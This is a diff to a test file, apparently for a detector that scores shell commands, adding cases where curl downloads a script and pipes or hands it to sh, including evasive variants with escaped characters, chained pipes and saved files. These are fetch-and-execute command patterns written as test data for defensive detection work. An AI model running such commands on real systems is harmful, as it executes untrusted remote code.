@@ -95,6 +95,12 @@ describe("a command that downloads a script and runs it is a remote shell howeve
     `curl -s ${URL} -o /tmp/p; /bin/cat /tmp/p | sh`,
     `curl -s ${URL} -o /tmp/p && sudo cat /tmp/p | sh`,
     `curl -s ${URL} -o /tmp/p; sudo /bin/sh /tmp/p`,
+    // an escaped ; is part of the URL, an escaped backslash leaves > a real redirect, four pipes, ./ before the file
+    `curl https://example.invalid/a\\;b | sh`,
+    `curl -H X:\\\\>&1 ${URL} | sh`,
+    `curl ${URL} | cat | cat | cat | sh`,
+    `curl -o p ${URL}; cat ./p | sh`,
+    `curl -o ./p ${URL} && sh p`,
   ]) {
     test(cmd, () => {
       const r = scoreOf(cmd);
